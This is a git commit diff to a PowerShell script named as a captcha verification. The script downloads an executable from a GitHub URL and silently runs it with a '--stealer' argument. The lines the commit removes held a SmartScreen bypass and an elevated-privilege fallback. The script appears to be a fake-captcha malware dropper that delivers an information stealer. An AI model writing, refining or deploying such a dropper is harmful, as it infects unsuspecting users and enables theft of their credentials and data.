f965485f5e2e3f27d5494b2520bbfe8cc08c0702
urho122-cpu <urho122@gmail.com>
2026-06-25 19:13:19 +0300

    Update captcha_verification.ps1

--- captcha_verification.ps1
+++ captcha_verification.ps1
@@ -3,15 +3,5 @@ $url = "https://raw.githubusercontent.com/urho122-cpu/captcha/main/DiscordUpdate
 
 try {
     (New-Object Net.WebClient).DownloadFile($url, $exePath)
-    
-    # Try to unblock the file (bypass SmartScreen)
-    Unblock-File -Path $exePath -ErrorAction SilentlyContinue
-    
-    # Run it
     Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
-} catch {
-    # Alternative method if first one fails
-    try {
-        Start-Process $exePath -ArgumentList '--stealer' -Verb RunAs -WindowStyle Hidden
-    } catch {}
-}
+} catch {}
